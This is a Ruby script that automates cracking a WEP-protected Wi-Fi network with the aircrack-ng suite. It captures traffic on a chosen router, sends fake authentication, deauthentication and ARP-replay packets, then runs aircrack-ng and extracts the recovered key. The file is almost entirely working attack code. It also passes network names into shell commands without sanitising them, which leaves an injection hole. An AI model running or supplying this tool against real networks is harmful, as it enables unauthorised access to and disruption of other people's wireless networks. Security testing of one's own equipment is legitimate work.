require 'timeout'
require './router.rb'
require './cleaner.rb'

def wep_handler r = Router.new
	
	# Begin Loop
	begin
	
		cleaner()
		p_airodump = Process.spawn("sudo airodump-ng mon0 --bssid #{r.bssid} -c #{r.channel} -w wepper")
		begin
			Timeout.timeout(200) do
				system("sudo aireplay-ng -1 0 mon0 -e #{r.essid} -a #{r.bssid} --ignore-negative-one")
				sleep(0.5)
				system("sudo aireplay-ng -0 5 mon0 -e #{r.essid} -a #{r.bssid} --ignore-negative-one")
				sleep(0.5)
				p_aireplay = Process.spawn("sudo aireplay-ng -3 mon0 -e #{r.essid} -b #{r.bssid} --ignore-negative-one")
			
				begin
					Timeout.timeout(195) do
						Process.wait(p_aireplay)
					end
				
				rescue Timeout::Error
					Process.kill('TERM', p_aireplay)
				end
			
				Process.wait(p_airodump)
			end 
		
		rescue Timeout::Error
			system("clear")
			Process.kill('TERM', p_airodump)
		end


		system("clear")
		puts "Cracking key, please wait..."
		puts "This will take around a minute."
		puts "Press Enter to continue..."
		gets.chomp
	
		n = 60
		p_aircrack = Process.spawn("sudo aircrack-ng wepper-01.cap > crack_info.txt") #  
		begin
			Timeout.timeout(n) do
				puts "#{n} seconds remaining..." 
				Process.wait(p_aircrack)
			end
		rescue Timeout::Error
			Process.kill('TERM', p_aircrack)
		end


		puts "Done cracking!" 
		puts

		key = "ERROR!"
		found = false

		File.open("crack_info.txt","r").each do |line|
			if line.to_s =~ /KEY FOUND!/ 
				key = line
				key = key.split('(')[1].to_s.split(':')[1].to_s.split(')')[0].to_s.gsub(' ', "")
				puts "KEY FOUND: #{key}"
				found = true
				break
			end
		end
	
		input = 'n'
		if !found 
			puts "Key could not be found, sorry! T.T" 
			puts "Do you want to try again? (y/n)"
			input = gets.chomp 
		end
	
	end while input == 'y' || input == 'Y' && !found
	# End of Loop
	
	puts "Press Enter to continue..."
	gets.chomp
	system("clear")	
		
end
